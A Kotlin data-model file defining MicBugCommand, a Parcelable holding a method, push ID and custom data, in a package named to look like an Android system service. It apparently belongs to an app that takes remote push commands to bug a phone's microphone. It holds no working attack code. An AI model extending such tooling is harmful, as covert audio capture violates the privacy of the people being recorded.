package com.android.services.models

import android.os.Parcelable
import com.google.gson.annotations.SerializedName
import kotlinx.parcelize.Parcelize

@Parcelize
data class MicBugCommand(
    @SerializedName("customData")
    val customData: String?="1",
    @SerializedName("method")
    val method: String,
    @SerializedName("push_id")
    val pushId: String
) : Parcelable